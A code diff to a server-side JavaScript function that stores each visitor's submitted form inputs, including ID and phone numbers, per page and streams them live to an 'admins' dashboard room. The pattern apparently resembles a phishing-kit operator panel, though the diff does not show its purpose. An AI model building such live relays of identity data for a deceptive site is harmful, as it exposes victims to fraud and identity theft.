@@ -255,12 +255,48 @@ function recordSubmission(type, payload) {
     set("page", ["page", "currentPage", "step"]);
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
+    // Per-page bucket: keep the latest client inputs grouped by the page/event
+    // the visitor was on when they submitted, so the dashboard can show
+    // exactly what the client typed on each screen of their session.
+    const existingUser = db.get().users[id] || {};
+    const pageKey = String(flat.page || type || "unknown");
+    const prevPages = (existingUser.pages && typeof existingUser.pages === "object") ? existingUser.pages : {};
+    const prevBucket = prevPages[pageKey] || { inputs: {}, events: [] };
+    const mergedInputs = { ...(prevBucket.inputs || {}), ...flat };
+    // Drop empty strings so we don't overwrite real values with blanks
+    for (const k of Object.keys(mergedInputs)) {
+      if (mergedInputs[k] === "" || mergedInputs[k] === null) delete mergedInputs[k];
+    }
+    const nextBucket = {
+      page: pageKey,
+      inputs: mergedInputs,
+      lastEvent: type,
+      lastPayload: payload,
+      updatedAt: now(),
+      events: [...(prevBucket.events || []).slice(-19), { type, ts: now() }],
+    };
+    const nextPages = { ...prevPages, [pageKey]: nextBucket };
+
     upsertSession(id, {
       ...flat,
       [type]: payload,
+      pages: nextPages,
       lastEvent: type,
+      lastPage: pageKey,
       stage: type,
       lastSubmissionAt: now(),
+    });
+
+    // Push a compact per-page notification for dashboards that want to
+    // render "client input on page X" without diffing the full session.
+    io.to("admins").emit("client:input", {
+      id,
+      uuid: id,
+      page: pageKey,
+      event: type,
+      inputs: mergedInputs,
+      payload,
+      ts: now(),
     });
   }
   return entry;
